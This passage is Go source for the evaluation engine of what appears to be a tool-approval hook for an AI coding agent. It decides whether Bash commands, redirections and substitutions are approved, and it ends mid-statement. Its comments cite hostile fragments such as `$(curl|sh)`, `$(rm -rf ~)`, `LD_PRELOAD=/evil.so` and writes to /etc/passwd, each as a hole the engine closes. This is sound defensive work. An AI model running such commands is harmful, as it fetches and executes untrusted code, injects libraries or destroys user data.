package engine

import (
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"github.com/phillipgreenii/claude-extended-tool-approver/internal/cmdparse"
	"github.com/phillipgreenii/claude-extended-tool-approver/internal/hookio"
	"github.com/phillipgreenii/claude-extended-tool-approver/internal/metrics"
	"github.com/phillipgreenii/claude-extended-tool-approver/internal/patheval"
	"github.com/phillipgreenii/claude-extended-tool-approver/internal/temproot"
)

// isSafeRedirectTarget is hookio.IsSafeRedirectTarget, kept as a local alias so
// this file's call sites and comments read unchanged. The predicate moved to
// hookio when the gitdir rule needed the same "this target captures nothing"
// answer for its copy-out detection (tc-403c); hookio owns the Redirection type,
// so it is the one place both an engine and a rule can reach.
func isSafeRedirectTarget(path string) bool { return hookio.IsSafeRedirectTarget(path) }

// isDynamicRedirectTarget reports whether a redirection target contains a shell
// expansion ($VAR, ${VAR}, $(...), backtick) that resolves only at runtime,
// hiding its real target from path evaluation. The hook process does not have
// the target shell's variables, so patheval.cleanPath's os.ExpandEnv erases
// `$TARGET` to "" BEFORE its unexpandedVarPattern guard can see it; the empty or
// partial remainder is then joined against the CWD and lands inside the project
// root as PathReadWrite. `> "$TARGET"` therefore auto-approved a write that the
// static `> /etc/hosts` correctly rejects (pg2-2u5jf). Mirrors the same refusal
// safecmds.argsHaveDynamicExpansion already applies to write-command path args.
// Checked AFTER isSafeRedirectTarget, which matches only literal device paths
// containing no `$` or backtick, so the two never interact.
func isDynamicRedirectTarget(path string) bool {
	return strings.ContainsAny(path, "$`")
}

// RuleErrorSink records a GENUINE rule failure (not hookio.ErrNotApplicable, which
// is a control signal) against the rule that produced it. Declared here rather than
// imported so the engine depends on the capability, not on a particular sink
// (dependency inversion); internal/metrics.RuleErrors satisfies it.
type RuleErrorSink interface {
	Record(rule string, err error)
}

type Engine struct {
	rules    []hookio.RuleModule
	pathEval *patheval.PathEvaluator
	trace    bool
	errSink  RuleErrorSink
}

func New(rules ...hookio.RuleModule) *Engine {
	return &Engine{rules: rules, errSink: metrics.DefaultRuleErrors}
}

// RegisterRules sets the rule list (for create-then-register pattern).
func (e *Engine) RegisterRules(rules ...hookio.RuleModule) {
	e.rules = rules
}

// RuleNames returns the registered rules' Name()s in EVALUATION order. Read-only
// introspection: Evaluate is first-match-wins, so this sequence — not merely the
// set — is the composed policy. Exists so a test can compare one chain against
// another (the pg2-v94d7 drift guard: the integration harness's chain must equal
// setup.RuleChain's) without reaching into the unexported rules slice.
func (e *Engine) RuleNames() []string {
	names := make([]string, len(e.rules))
	for i, rule := range e.rules {
		names[i] = rule.Name()
	}
	return names
}

// SetPathEvaluator sets the path evaluator for I/O redirection evaluation.
func (e *Engine) SetPathEvaluator(pe *patheval.PathEvaluator) {
	e.pathEval = pe
}

// SetTrace enables or disables trace collection and stderr logging.
func (e *Engine) SetTrace(enabled bool) {
	e.trace = enabled
}

// SetRuleErrorSink overrides where genuine rule failures are recorded. A nil sink
// is honoured (failures are then only logged), so a test can silence the counter
// without reaching into the default.
func (e *Engine) SetRuleErrorSink(s RuleErrorSink) {
	e.errSink = s
}

// Evaluate runs the first-match-wins chain.
//
// This is the ONE chokepoint that discriminates ADR 0043's three rule outcomes, and
// its signature deliberately stays a BARE RuleResult: by the time the chain is
// exhausted, participation and failure have both been consumed here, so the only
// thing left to report is a verdict. That also means *Engine does NOT satisfy
// hookio.RuleModule — it never did (it has no Name method), and now its Evaluate
// signature differs too. engine_conformance_test.go pins both halves of that so a
// future "just register the engine as a rule" cannot happen silently.
//
// The three cases:
//
//	err == nil                       -> the rule HANDLED it. Return its verdict,
//	                                    including a NoOpinion verdict, which is
//	                                    terminal and emits {}.
//	errors.Is(err, ErrRefused)       -> REFUSED (ADR 0044). The rule examined the input
//	                                    and will not clear it, but a later rule may
//	                                    still own it: fold its RuleResult into `floor`
//	                                    and continue. Checked BEFORE ErrNotApplicable,
//	                                    which it matches by design.
//	errors.Is(err, ErrNotApplicable) -> NOT MY BUSINESS. Continue; the RuleResult is
//	                                    ignored (ADR 0043's Decision, point 2).
//	any other err                    -> COULD NOT DETERMINE. Record it PER RULE in
//	                                    the error sink, log it, and continue — ADR
//	                                    0043's error policy is continue-by-default.
//	                                    A rule whose whole purpose is an identity or
//	                                    ownership check it could not complete does
//	                                    NOT come through here: it returns its own
//	                                    fail-closed verdict with a nil error, which
//	                                    is the first case (killshell's Ask).
//
// Loop exhaustion still MANUFACTURES the terminal NoOpinion, unchanged.
//
// TWO THINGS ADR 0044 ADDS, and they are the same fact from both ends:
//
//  1. THE FLOOR. Refusals accumulate in `floor` and are folded into whatever the chain
//     concludes — a rule's verdict or the manufactured exhaustion — through
//     MostRestrictive. A floor can therefore only make a leaf MORE restrictive; it
//     never shadows a later rule (that rule still runs and its Ask/Reject still wins),
//     which is precisely why a refusal does not have to choose between the two
//     ordering shapes ADR 0043 had to weigh for every conversion.
//  2. THE EXHAUSTION CLAIM. The manufactured NoOpinion is marked
//     ProvenanceExhaustion ONLY when no rule refused and no rule FAILED. A genuine
//     failure is absence of evidence, so treating it as an exhaustion would let a
//     systematically-broken resolver clear bodies wholesale. The refusal half needs no
//     flag: a NoOpinion floor ties with the manufactured NoOpinion and
//     MostRestrictive's tie-merge turns the pair into a refusal on its own.
func (e *Engine) Evaluate(input *hookio.HookInput) hookio.RuleResult {
	var trace []hookio.TraceEntry

	// floor is seeded with the Approve identity — the same neutral seed the
	// expression-level folds use — so a chain in which nobody refuses contributes
	// nothing and behaves exactly as it did before ADR 0044.
	floor := hookio.RuleResult{Decision: hookio.Approve, Module: "engine"}
	sawFailure := false

	for _, rule := range e.rules {
		result, err := rule.Evaluate(input)
		refused := errors.Is(err, hookio.ErrRefused)

		// A non-nil error means the RuleResult is not a verdict, so the trace must
		// not present it as one: NoOpinion (the value the chain effectively carries
		// forward) plus the out-of-band reason, which is the only place the
		// distinction between "not applicable" and a real failure is visible.
		//
		// A REFUSAL is the exception: its RuleResult IS a real contribution (the floor),
		// and its Reason is the very text ADR 0043 had to demote to a comment, so it is
		// traced as itself rather than replaced by the sentinel's message.
		if e.trace {
			traced := result
			if err != nil && !refused {
				traced = hookio.RuleResult{Decision: hookio.NoOpinion, Reason: err.Error()}
			}
			entry := hookio.TraceEntry{
				RuleName: rule.Name(),
				Decision: traced.Decision,
				Reason:   traced.Reason,
			}
			trace = append(trace, entry)
			fmt.Fprintf(os.Stderr, "claude-extended-tool-approver: TRACE %s -> %s: %s\n",
				rule.Name(), traced.Decision, traced.Reason)
		}

		if err != nil {
			// ORDER IS LOAD-BEARING: ErrRefused matches ErrNotApplicable under
			// errors.Is (see hookio.refusalError, and why that is a subtype claim
			// rather than the wrap ADR 0043 forbids), so the specific case is tested
			// first. An engine that did NOT test for it would treat a refusal as a
			// plain not-applicable — losing the floor but never mis-reading it as a
			// verdict, which is the fail-safe direction.
			if refused {
				floor = hookio.MostRestrictive(floor, result)
				fmt.Fprintf(os.Stderr, "claude-extended-tool-approver: %s -> refused (floored at %s, continuing): %s\n",
					rule.Name(), result.Decision, result.Reason)
				continue
			}
			// errors.Is, never ==, and never a wrap-tolerant substring match: ADR
			// 0043 forbids wrapping ErrNotApplicable precisely so this comparison
			// cannot be defeated from the rule side.
			if !errors.Is(err, hookio.ErrNotApplicable) {
				sawFailure = true
				e.recordRuleError(rule.Name(), err)
				fmt.Fprintf(os.Stderr, "claude-extended-tool-approver: %s -> error (continuing): %v\n",
					rule.Name(), err)
			}
			continue
		}

		// nil error == HANDLED, so EVERY decision short-circuits — including
		// NoOpinion, which under ADR 0043 is the rule saying "I handled this and my
		// answer is no gate". Only the error branch above continues the loop.
		if result.Decision != hookio.NoOpinion && input.ToolName == "Bash" {
			// The trailing-comment annotation is for a GATING verdict a human will
			// read on the prompt; a NoOpinion emits {} and shows nobody a reason, so
			// it is left alone exactly as the pre-ADR-0043 Abstain path was.
			//
			// Reads the leaf's OWN Comment when the engine threaded ParsedLeaf (ADR
			// 0039 step 3): ParsedCommand.Comment is the identical fact
			// cmdparse.CommandComment(cmd) used to re-derive by re-parsing this same
			// leaf's round-tripped Raw, so this is not a behaviour change, only the
			// removal of a redundant parse. Falls back to the pre-existing
			// BashCommand()+CommandComment path for a caller that invoked Evaluate
			// directly (a unit test, or any future non-engine caller) without
			// threading ParsedLeaf at all.
			if leaves, ok := input.ParsedLeaf.([]cmdparse.ParsedCommand); ok {
				for _, leaf := range leaves {
					if leaf.Comment != "" {
						result.Reason = result.Reason + " (note: " + leaf.Comment + ")"
						break
					}
				}
			} else if cmd, err := input.BashCommand(); err == nil {
				if comment := cmdparse.CommandComment(cmd); comment != "" {
					result.Reason = result.Reason + " (note: " + comment + ")"
				}
			}
		}
		fmt.Fprintf(os.Stderr, "claude-extended-tool-approver: %s -> %s: %s\n",
			rule.Name(), result.Decision, result.Reason)
		// An earlier rule's refusal survives this rule's verdict as a FLOOR, so a
		// later Approve is demoted to the floor while an Ask/Reject keeps its own
		// verdict. `result` is `current`, so its Reason wins a tie and the floor's
		// Reason surfaces only when the floor is strictly more restrictive — which is
		// the case where it is the only explanation there is.
		result = hookio.MostRestrictive(result, floor)
		result.Trace = trace
		return result
	}

	// Loop exhaustion. The claim is made HERE and nowhere else: the chain ran out with
	// nobody owning the input, so this is the one legitimate ProvenanceExhaustion in
	// the tree. A genuine failure withdraws the claim (see sawFailure); a refusal
	// withdraws it through the tie-merge below, with no flag of its own.
	result := hookio.RuleResult{Decision: hookio.NoOpinion}
	if !sawFailure {
		result.Provenance = hookio.ProvenanceExhaustion
	}
	// floor is `current` so ITS Reason survives a tie with the reason-less
	// manufactured verdict — the restored text of the refusal is what a trace reader
	// and a user-facing prompt need.
	result = hookio.MostRestrictive(floor, result)
	if e.trace {
		result.Trace = trace
	}
	return result
}

// recordRuleError funnels sink writes through one nil check so SetRuleErrorSink(nil)
// is a supported way to silence the counter.
func (e *Engine) recordRuleError(rule string, err error) {
	if e.errSink != nil {
		e.errSink.Record(rule, err)
	}
}

// EvaluateHook is the single dispatch point for real hook decisions (Facade).
// Bash commands are routed through EvaluateExpression, which splits compounds
// and folds every leaf/redirection/process-substitution most-restrictive-wins;
// all other tools use the first-match-wins Evaluate (EvaluateExpression is
// Bash-only). All real-decision callers (the PreToolUse hook and offline replay)
// MUST go through this so baselines match the live hook.
func (e *Engine) EvaluateHook(input *hookio.HookInput) hookio.RuleResult {
	if input.ToolName == "Bash" {
		if cmd, err := input.BashCommand(); err == nil {
			return e.EvaluateExpression(cmd, nil, input)
		}
	}
	return e.Evaluate(input)
}

// mostRestrictiveAttributed folds candidate into acc with EXACTLY the same
// Decision-ordering rule as hookio.MostRestrictive — so no VERDICT can ever
// differ from calling hookio.MostRestrictive directly — but breaks an
// Approve/Approve TIE in favor of whichever side carries a RULE's own
// attribution over the engine's generic "nothing to judge" identity (pg2-he22o).
//
// Every accumulator this file folds into — EvaluateExpression's
// mostRestrictive and foldSubstitutionScan's result — is SEEDED at
// {Approve, Module: "engine"}: the least-restrictive
// identity for a "the whole is Approve iff every part independently approves"
// fold, so that zero parts contributes nothing. hookio.MostRestrictive's tie-
// break keeps `current`, and with the seed always occupying that slot across
// every subsequent fold, the FIRST rule that ever decisively approved a part
// had its Module silently replaced by the seed's "engine" — even though the
// seed itself never formed an opinion. That is the attribution bug this
// function exists to fix. It is reached ONLY when both sides already agree
// the Decision is Approve, so it can never move a verdict — only relabel who
// gets credit for one that was already there.
//
// candidate.Module == "engine" is true of every neutral "nothing to judge"
// contribution this engine emits on the Approve path (evaluateRedirections'
// no-op branches, evaluateAssignmentOnlyLeaf's neutral branch, and
// foldSubstitutionScan's own seed, folded for both command-position and
// heredoc-body substitutions) — no registered rule module is named "engine"
// (audited: internal/rules/*/*.go). A candidate that
// is Approve and NOT "engine" can therefore only be a rule's own decisive
// verdict: e.Evaluate returns Approve only from a rule (its manufactured
// exhaustion is always NoOpinion, never Approve — see Evaluate's loop-
// exhaustion comment), and EvaluateExpression's own return is post-processed
// by withExpressionProvenance but never re-attributed. Preferring it over an
// "engine" accumulator is attribution-only, never verdict-changing.
func mostRestrictiveAttributed(acc, candidate hookio.RuleResult) hookio.RuleResult {
	if acc.Decision == hookio.Approve && candidate.Decision == hookio.Approve &&
		acc.Module == "engine" && candidate.Module != "engine" {
		return candidate
	}
	return hookio.MostRestrictive(acc, candidate)
}

func (e *Engine) EvaluateExpression(expr string, stack []hookio.StackFrame, origin *hookio.HookInput) hookio.RuleResult {
	normalized := normalizeExpression(expr)
	if cyc, hit := detectCycle(normalized, stack); hit {
		return cyc
	}

	// ONE PARSE, through the seam (ADR 0039 step 2, pg2-fez3d). The comment
	// pre-strip that used to sit here is GONE, not replaced: under
	// KeepComments(true) a comment is a parser FACT and never appears in a
	// command's words, so `StripCommentsPreservingHeredocs` — a text pass that had
	// to be taught where heredoc bodies were, and whose whole reason for existing
	// was that a '#' inside a body is data (pg2-r2rf3) — has nothing left to do.
	// The parser is handed the ORIGINAL expr.
	//
	// This is EvaluateExpression's own TEXT entry point (I7's permanent one —
	// the hook receives a command string and nothing upstream has parsed it,
	// and rule packages like envvars/docker/nix/kubectl reach it with genuinely
	// constructed or extracted text that has no corresponding subtree in any
	// prior parse). evaluateParsed below is the shared core: this function's
	// only extra job, versus evaluateParsed, is producing `sp` by parsing.
	//
	// outerVars/outerTempDirVars are nil here, deliberately: every caller of THIS
	// entry point is evaluating a command in a NEW shell scope, not a substitution
	// lexically nested inside the caller's own expression — envvars/docker/nix/kubectl
	// each recurse into an INNER shell (a container's, a subshell `-c` argument's) whose
	// variables genuinely are not the outer command's, and the top-level Bash-tool call
	// has no enclosing scope at all. Only foldSubstitutionScan's own recursive
	// evaluateParsed call (below) threads a non-nil outer scope, because a `$(...)` /
	// arithmetic-expansion body is evaluated IN the same shell as the leaf that contains
	// it — see evaluateParsed's outerVars doc for the full reasoning (bead tc-5h6e).
	return e.evaluateParsed(expr, cmdparse.ParseShell(expr), normalized, stack, origin, nil, nil)
}

// EvaluateStructure is ADR 0039 I13's STRUCTURAL delegate entry point
// (`:291-294`): the counterpart to EvaluateExpression above for a caller that
// already HOLDS parsed structure and must not turn it back into a command
// STRING just to re-enter this seam. It satisfies hookio.Evaluator's method
// of the same name — see that interface's doc for the full contract and for
// why `leaves` is typed `any` there (and, for the identical import-direction
// reason, here too: this file is internal/engine, which imports cmdparse
// freely, but the parameter's static type must match the interface method it
// implements exactly, so it stays `any` here as well and is asserted back to
// []cmdparse.ParsedCommand below).
//
// It is ADDITIVE and, as of the bead that introduces it (pg2-m1i6r), unused
// by any rule: no caller is migrated onto it here, and none of the four rule
// packages that still build text for EvaluateExpression (docker, safecmds,
// nix, kubectl) are touched. Its own tests (structural_delegate_test.go)
// exercise it directly against a hand-built stack of leaves.
//
// The shape MIRRORS EvaluateExpression deliberately — cycle check first, then
// evaluateParsed — with the one difference that matters: no parse happens
// here, because `leaves` is already the lowered subtree (I7: never re-parse
// what an earlier parse already produced). That mirroring is what makes
// "verdict folding through this entry point matches the recursion-boundary
// semantics rules rely on today" true BY CONSTRUCTION rather than by a
// second implementation that could drift: both entry points terminate in the
// SAME evaluateParsed call, so hookio.FromRecursion's ADR 0043 translation of
// the returned bare RuleResult behaves identically regardless of which entry
// point produced it.
//
// A `leaves` value that does not assert to []cmdparse.ParsedCommand — which
// cannot happen from any caller in this tree today, since nothing calls this
// method yet, but the interface widens the static type to `any` for every
// FUTURE caller too — fails CLOSED: NoOpinion, never Approve, exactly as
// evaluateRedirections and heredocFloor already do for their own "cannot
// evaluate this" branches.
func (e *Engine) EvaluateStructure(source string, leaves any, stack []hookio.StackFrame, origin *hookio.HookInput) hookio.RuleResult {
	normalized := normalizeExpression(source)
	if cyc, hit := detectCycle(normalized, stack); hit {
		return cyc
	}
	parsed, ok := leaves.([]cmdparse.ParsedCommand)
	if !ok {
		return hookio.RuleResult{
			Decision: hookio.NoOpinion,
			Reason:   "structural delegate received leaves of an unexpected type (deferred to claude-code)",
			Module:   "engine",
		}
	}
	// outerVars/outerTempDirVars nil for the same reason as EvaluateExpression's own
	// entry point above: no caller of this structural delegate is a substitution
	// lexically nested inside an enclosing expression either.
	return e.evaluateParsed(source, cmdparse.ShellParse{Leaves: parsed}, normalized, stack, origin, nil, nil)
}

// detectCycle is EvaluateExpression's cycle check, factored out so
// foldSubstitutionScan's substitution/heredoc-body recursion (ADR 0039 step 4,
// pg2-1019a) can run it directly against a body's own normalized text without
// going through EvaluateExpression's TEXT entry point above — which would
// re-parse a body this function's caller already has pre-lowered leaves for
// (I7: MUST NOT re-parse body text).
func detectCycle(normalized string, stack []hookio.StackFrame) (hookio.RuleResult, bool) {
	for _, frame := range stack {
		if frame.Expression == normalized {
			return hookio.RuleResult{
				Decision: hookio.NoOpinion,
				Reason:   "recursive evaluation: cycle detected (command repeated in stack)",
				Module:   "engine",
			}, true
		}
	}
	return hookio.RuleResult{}, false
}

// evaluateParsed is EvaluateExpression's shared core, over an ALREADY-LOWERED
// cmdparse.ShellParse (ADR 0039 I7: never parsed here, only consumed). It has
// THREE callers, all of which parse (or already hold leaves) BEFORE reaching
// here and never after: EvaluateExpression's text entry point above (which
// just parsed expr to produce sp); EvaluateStructure above, ADR 0039 I13's
// structural delegate entry point (which never parses at all — its caller
// already holds the lowered subtree); and foldSubstitutionScan below, which
// already holds a substitution's or heredoc body's pre-lowered leaves and
// must not re-parse them (that re-parse was the two "thin shim" TEXT hops
// pg2-1019a removed — see foldSubstitutionScan's own doc). EvaluateStructure
// is what makes the third caller's shape a PUBLIC, reusable entry point
// rather than an engine-internal-only pattern foldSubstitutionScan happened
// to also use.
//
// expr is the EXACT source text sp was lowered from — EvaluateExpression's own
// parameter, EvaluateStructure's `source`, or foldSubstitutionScan's
// sub.Body — needed here (as opposed to merely for the cycle key) for
// heredocFloor's own text-classification narrowing and for the synthetic
// HookInput's RootExpression.
//
// normalized is the caller's already-computed cycle-detection key for THIS
// sp's own source text — EvaluateExpression's/EvaluateStructure's `normalized`,
// or foldSubstitutionScan's per-substitution `subNormalized` — since every
// caller needs it themselves (for stack frames / cycle checks) and computing
// it twice would be redundant.
//
// outerVars/outerTempDirVars (bead tc-5h6e) are the in-command environment ESTABLISHED
// OUTSIDE sp — visible to sp's leaves not because anything IN sp assigned it, but
// because sp is lexically nested inside an enclosing expression that already had. The
// two top-level entry points (EvaluateExpression/EvaluateStructure) always pass nil,nil:
// a fresh Bash-tool call or a structural-delegate call has no enclosing scope.
// foldSubstitutionScan is the one caller that passes a real value — see its own doc for
// why a command-substitution or arithmetic-expansion BODY is a different case from those
// two entry points (it runs IN the same shell as its enclosing leaf, so the leaf's own
// visible bindings genuinely apply inside it too).
//
// Per leaf i, the value actually handed to a rule (via syntheticInput.InCommandVars) is
// cmdparse.OverlayVars(outerVars, cmdparse.InCommandVars(parsed, i)) — outerVars as the
// FARTHER scope, this sp's own leaves before i as the NEARER one that can shadow or
// revoke a same-named outer binding (InCommandVars' own revocation rule applies exactly
// as before; overlaying changes WHICH bindings a leaf can see, never how a binding, once
// visible, is interpreted). That merged value is ALSO what gets passed down as the NEW
// outerVars to foldSubstitutionScan for any substitution nested inside leaf i itself —
// this is the recursive step that makes a THIRD level of nesting (a substitution inside
// a substitution inside a substitution) see the outermost command's bindings exactly as
// the first level does, because each level hands the next the union of everything visible
// to it, not merely its own immediate parent's contribution.
func (e *Engine) evaluateParsed(expr string, sp cmdparse.ShellParse, normalized string, stack []hookio.StackFrame, origin *hookio.HookInput, outerVars, outerTempDirVars map[string]string) hookio.RuleResult {
	parsed := sp.Leaves

	// I1b — the fail-safe PARSE floor. A whole-command parse failure MUST yield a
	// non-approving verdict, applied as a MostRestrictive FOLD and never as an early
	// return: the fold is what keeps the result order-independent, and it is why the
	// floor is seeded into `mostRestrictive` below instead of returned from here.
	// This is STRONGER than I1a: no leaf is examined, so any Reject a leaf would
	// have earned is FORFEITED. Every such row is reported as a forfeiture in the
	// migration replay (ADR 0039's Consequences, and LOWERING.md's step 2 replay).
	//
	// It is also I10: CETA MUST NOT Approve a command the bash parser could not
	// parse, and where the parser ATTRIBUTED the failure to a dialect the reason
	// names it — where it did not, the reason reports the failure WITHOUT guessing
	// at a cause.
	if !sp.Unparseable && len(parsed) == 0 {
		// Parsed cleanly and contains no command at all: whitespace, or nothing but
		// comments. Unchanged behaviour, and deliberately NOT merged with the
		// unparseable branch — "there is nothing here" and "I could not read this"
		// are different answers and only the second is a floor.
		return hookio.RuleResult{Decision: hookio.NoOpinion, Module: "engine"}
	}

	// Evaluate each sub-command, track most restrictive.
	// Seed with Approve — the least-restrictive identity for the fold: an
	// expression is Approve iff EVERY leaf independently approves.
	mostRestrictive := hookio.RuleResult{Decision: hookio.Approve, Reason: "all sub-commands approved", Module: "engine"}
	if sp.Unparseable {
		mostRestrictive = hookio.MostRestrictive(mostRestrictive, unparseableExpressionFloor(sp))
	}

	// Running cwd/path-evaluator threaded across leaves so a relative path after
	// a `cd` resolves against the cd target, not the original cwd (pg2-opclh).
	// basePE is the effective evaluator used to re-root after a cd: origin's
	// PathEval wins when set (container mode), else the engine's evaluator — the
	// same fallback evaluateRedirections applies for a nil override, so the
	// running state stays consistent with it.
	currentCWD := origin.CWD
	currentPathEval := origin.PathEval
	basePE := origin.PathEval
	if basePE == nil {
		basePE = e.pathEval
	}

	// judgedLeaf records that at least one leaf's own content was actually judged: it
	// ran a command, it carried a redirection/heredoc, or a rule was decisive about
	// its env assignments. An expression where NO leaf qualifies is nothing but
	// assignments nobody owns — it executes nothing and was judged by nobody, so the
	// Approve seed is not a verdict anyone earned and must not be returned (see the
	// floor after the loop).
	judgedLeaf := false

	for i, pc := range parsed {
		// The variables the EARLIER leaves of this expression established, for the
		// rules that must judge a path (primary-commit) and for this loop's own
		// `cd`/`pushd` re-root below. Recomputed per leaf rather than folded
		// incrementally so the map handed to a rule is a snapshot no later leaf can
		// mutate, and so no `continue` in this loop can skip an accumulation step.
		// `before` is the leaf's own index, which is what excludes a leaf's own prefix
		// assignments from its own expansions — see cmdparse.InCommandVars.
		//
		// Overlaid onto outerVars (tc-5h6e): sp's own leaves are, from the point of view
		// of a name outerVars already binds, the NEARER scope, so a local write shadows
		// or (per InCommandVars' revocation rule) removes an outer binding of the same
		// name, while a name sp never touches keeps whatever outerVars said about it.
		// For the two top-level entry points outerVars is nil and this is exactly
		// cmdparse.InCommandVars(parsed, i) as before — no behaviour change there.
		inCommandVars := cmdparse.OverlayVars(outerVars, cmdparse.InCommandVars(parsed, i))
		// The sibling scan for a DIFFERENT fact about those same earlier leaves:
		// which of their names are bound to a fresh `mktemp -d` directory rather
		// than to a literal value (cmdparse.InCommandTempDirVars, pg2-d71my). Same
		// per-leaf recomputation reasoning as inCommandVars above, and the same
		// outerTempDirVars overlay for the same tc-5h6e reason.
		inCommandTempDirVars := cmdparse.OverlayVars(outerTempDirVars, cmdparse.InCommandTempDirVars(parsed, i))

		if pc.Executable == "" {
			// Command-less leaf: no executable, but it may carry env assignments
			// (`LD_PRELOAD=/evil.so && cmd`, pg2-mtnmb) or redirections/a heredoc (the
			// trailing "> /etc/passwd" of a subshell) that MUST still be evaluated —
			// otherwise the injection, or the write to a protected path, is silently
			// approved.
			leafResult := e.evaluateRedirections(pc.Redirections, currentPathEval)
			if len(pc.Redirections) > 0 {
				judgedLeaf = true
			}
			if pc.HasHeredoc {
				// pc.Executable is always "" on this branch (the command-less-leaf
				// arm), so it can never match heredocStdinSinkFlags or
				// heredocReaderAllowlist — pc is threaded through anyway for a
				// uniform signature with the call below, and
				// messageSinkStdinHeredocCleared/pipeRelayHeredocCleared (via
				// cmdparse.HeredocReaderCleared) both just no-op on the empty
				// executable. parsed (this leaf's own sibling slice) is threaded
				// through too, for the same uniform-signature reason — pc having no
				// executable makes pipeRelayHeredocCleared refuse before it would
				// ever consult parsed.
				leafResult = hookio.MostRestrictive(leafResult, heredocFloor(expr, stack, pc, parsed))
				// inCommandVars/inCommandTempDirVars (tc-5h6e), not outerVars/outerTempDirVars:
				// a substitution inside THIS leaf's heredoc body sees what THIS leaf sees,
				// which is the already-overlaid value computed above — see evaluateParsed's
				// outerVars doc for why passing outerVars unmerged here would drop this leaf's
				// own earlier siblings for a body that is, textually, still part of THIS leaf.
				leafResult = hookio.MostRestrictive(leafResult,
					e.foldSubstitutionScan(pc.UnquotedHeredocSubstitutions(), normalized, stack, origin, inCommandVars, inCommandTempDirVars))
				judgedLeaf = true
			}
			if assignResult, judged := e.evaluateAssignmentOnlyLeaf(pc, currentCWD, expr, parsed, inCommandVars, inCommandTempDirVars, origin); judged {
				// mostRestrictiveAttributed, not hookio.MostRestrictive directly: assignResult
				// can be a rule's own decisive Approve (e.g. envvars' preserves-caller-value
				// case), and leafResult is still the engine-attributed redirection seed at
				// this point — a plain tie-break would discard the rule's Module (pg2-he22o).
				leafResult = mostRestrictiveAttributed(leafResult, assignResult)
				judgedLeaf = true
			}
			// A command-less leaf's Raw can still hold a live substitution, and this
			// branch used to `continue` before reaching the recursion below — so
			// nothing ever recursed it. That is what let a `for` loop's word list
			// smuggle `$(curl|sh)` past every rule once the word list became a leaf of
			// its own (pg2-qkecz hole B).
			//
			// pc.Substitutions already excludes env-assignment VALUES, matching what
			// cmdparse.StripLeadingEnvAssignments used to strip before this scan —
			// those are the static classifyExpansion path (pg2-gkd5e), and recursing
			// them here too would double-judge them under a different model. It was
			// computed during ParseShell's own walk of pc's already-parsed subtree
			// (ADR 0039 step 4, I7/I12), so there is no re-parse of pc.Raw here at
			// all. The fold is seeded with the neutral Approve, so a leaf with no
			// substitutions contributes nothing and cannot demote an otherwise-approved
			// expression.
			//
			// mostRestrictiveAttributed (not a plain fold): a substitution body here
			// recurses through evaluateParsed, so its Approve can already carry a
			// rule's own attribution rather than the neutral "no substitutions" seed —
			// same pg2-he22o concern as the assignment fold above.
			//
			// inCommandVars/inCommandTempDirVars (tc-5h6e): see the heredoc call above —
			// this command-less leaf's own substitutions are lexically part of IT, so they
			// inherit exactly what this leaf's own overlay computed, not the raw outer value.
			leafResult = mostRestrictiveAttributed(leafResult,
				e.foldSubstitutionScan(pc.Substitutions, normalized, stack, origin, inCommandVars, inCommandTempDirVars))
			// mostRestrictiveAttributed here too: this is the fold that used to be a
			// raw `leafResult.Decision > mostRestrictive.Decision` strict compare, which
			// never revisits an exact tie — silently keeping mostRestrictive's engine
			// attribution even when leafResult carries a rule's own Approve. Decision-wise
			// it is unchanged: the strict-greater branch behaves identically, and the added
			// tie branch only fires when both sides already agree the Decision is Approve
			// (pg2-he22o).
			mostRestrictive = mostRestrictiveAttributed(mostRestrictive, leafResult)
			continue
		}
		judgedLeaf = true

		// Build synthetic HookInput (using the running cwd/path-evaluator so a
		// leaf after a `cd` resolves relative paths against the cd target).
		//
		// ParsedLeaf/ParsedRoot replace the deleted mustBashJSON(pc.Raw) round trip
		// (ADR 0039 step 3, root cause 3): rather than re-serialising pc.Raw into a
		// synthetic ToolInput JSON string for every rule to independently
		// unmarshal and re-parse, the ALREADY-COMPUTED structure is threaded
		// directly. ParsedLeaf is parsedLeafFor(pc) — see that function's doc for
		// why it is no longer an unconditional `cmdparse.Parse(pc.Raw)` (guard 3,
		// I7, pg2-x9452): a leaf's rule-side leaf set stays byte-for-byte what it
		// always was, including the documented heredoc-bleed case where
		// re-parsing Raw yields more than one leaf, but a leaf that cannot bleed
		// is threaded directly instead of being re-parsed a second time. ParsedRoot
		// is `parsed` itself — the SAME slice this function derived from `expr` at
		// its own top, so a rule reaching for the expression's sibling leaves
		// (git's expressionScope, gitdir's pipeScope) needs no re-parse of
		// RootExpression at all.
		syntheticInput := &hookio.HookInput{
			SessionID:            origin.SessionID,
			CWD:                  currentCWD,
			ToolName:             "Bash",
			ParsedLeaf:           parsedLeafFor(pc),
			PermissionMode:       origin.PermissionMode,
			HookEventName:        origin.HookEventName,
			PathEval:             currentPathEval,
			RootExpression:       expr,
			ParsedRoot:           parsed,
			InCommandVars:        inCommandVars,
			InCommandTempDirVars: inCommandTempDirVars,
		}

		// Evaluate through rule chain
		cmdResult := e.Evaluate(syntheticInput)

		// Evaluate I/O redirections. With the restrictiveness ordering
		// (Approve < NoOpinion < Ask < Reject) a plain most-restrictive-wins
		// comparison correctly lets an unknown redirection path (NoOpinion) demote
		// an otherwise-approved command — no special case needed.
		redirResult := e.evaluateRedirections(pc.Redirections, currentPathEval)
		cmdResult = hookio.MostRestrictive(cmdResult, redirResult)

		// Substitution-body recursion (pg2-1q5i3). Every top-level $(...) / `...` /
		// <(...) / >(...) body in the COMMAND (env-assignment values excluded — those
		// are the static classifyExpansion path / pg2-gkd5e) is re-evaluated through
		// ALL rules with a pushed StackFrame (so the cycle check above fires) and
		// folded most-risky-wins. pc.Substitutions was found by walking pc's own
		// already-parsed subtree during ParseShell's one walk of expr (ADR 0039 step
		// 4, I7/I12) — not by re-scanning pc.Raw — so a single-quoted literal
		// `'$(rm -rf ~)'` is still correctly absent (the parser never produced a
		// CmdSubst node for it) and a double-quoted `"$(cmd)"` is still present. This
		// replaces the former static command-substitution guard AND the
		// process-substitution loop with one shared enumerator.
		//
		// inCommandVars/inCommandTempDirVars (tc-5h6e), the SAME merged value just
		// threaded into syntheticInput.InCommandVars above: a `$(...)`/`$((...))` in
		// THIS leaf's own argv runs in the same shell THIS leaf runs in, so it sees
		// every binding this leaf sees — including one an EARLIER SIBLING leaf
		// established, which is exactly the propagation this bead restores (before it,
		// this call passed the recursion nothing but `origin`, so a leaf like
		// `echo "$(cat $SP/full.start)"` recursed into `cat $SP/full.start` with no
		// memory that an earlier `SP=<literal>` leaf had ever run).
		cmdResult = hookio.MostRestrictive(cmdResult,
